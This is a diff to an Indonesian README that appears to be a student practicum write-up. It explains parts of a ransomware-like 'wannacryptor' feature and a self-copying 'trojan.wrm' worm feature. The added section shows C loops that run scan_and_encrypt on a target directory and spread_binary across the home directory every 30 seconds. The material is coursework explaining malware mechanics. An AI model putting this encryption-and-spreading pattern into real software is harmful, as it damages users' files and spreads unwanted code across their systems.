@@ -411,6 +411,7 @@ void scan_and_encrypt(const char *dirpath) {
 
   ### c. Anak Fitur Kedua
   Anak fitur kedua bernama trojan.wrm. Caranya sama seperti anak fitur pertama, yaitu menggunakan fungsi. Untuk soal ini, diperlukan dua fungsi.
+  
   1) Fungsi ```copy_file(const char *source, const char *dest)```
      Untuk kodenya seperti ini
      
@@ -443,7 +444,7 @@ void scan_and_encrypt(const char *dirpath) {
       - Setelah itu, dilakukan copy file ke destinasi yang dituju.
       - Lalu, source dan dst di-close.
 
-  2) Fungsi
+  2) Fungsi ```spread_binary(const char *current_dir, const char *self_path)```
 
      Untuk kodenya seperti ini
      ```
@@ -478,7 +479,47 @@ void scan_and_encrypt(const char *dirpath) {
      - Lalu, dilakuakn ```snprintf``` fullpath untuk mendapatkan data dengan ```current_dir``` dan ```entry->d_name```.
      - Pengecekan dilakukan untuk mengetahui bahwa ```fullpath``` merupakan directory atau bukan. Jika ```fullpath``` merupakan directory, maka fungsi ```spread_binary(fullpath, self_path)``` akan dijalankan.
 
+### d. Looping 30 Detik
 
+Dalam soal diminta banak fitur pertama dan anak fitur kedua untuk berjalan setiap 30 detik. Untuk kodenya seperti ini
+```
+void wannacryptor_repeat() {
+    while (1) {
+        char self_path[MAX_PATH];
+        ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
+        if (len == -1) exit(EXIT_FAILURE);
+        self_path[len] = '\0';
+        
+        char *home = getenv("HOME");
+        if (!home) home = "/";
+        
+        scan_and_encrypt(TARGET_DIR);
+        sleep(30);
+    }
+}
+
+void trojan_repeat() {
+    while (1) {
+        char self_path[MAX_PATH];
+        ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
+        if (len == -1) exit(EXIT_FAILURE);
+        self_path[len] = '\0';
+        
+        char *home = getenv("HOME");
+        if (!home) home = "/";
+
+        spread_binary(home, self_path);
+        sleep(30);
+    }
+}
+```
+Penjelasan:
+- While ```True```, fungsi akan berjalan secara terus menerus.
+- Fungsi akan membaca ```self_path```, yaitu membaca path sendiri.
+- Setelah itu, ```*home``` akan mengambil data yaitu ```getenv("HOME")```.
+- Jika ```home``` tidak ada, maka ```home``` dideklarasikan dengan ```home = "/"```.
+- Jika ```home``` ada, maka fungsi menjalankan fungsi tertentu.
+     
   <h2 id="soal4">Soal4</h2>
 
 <p>
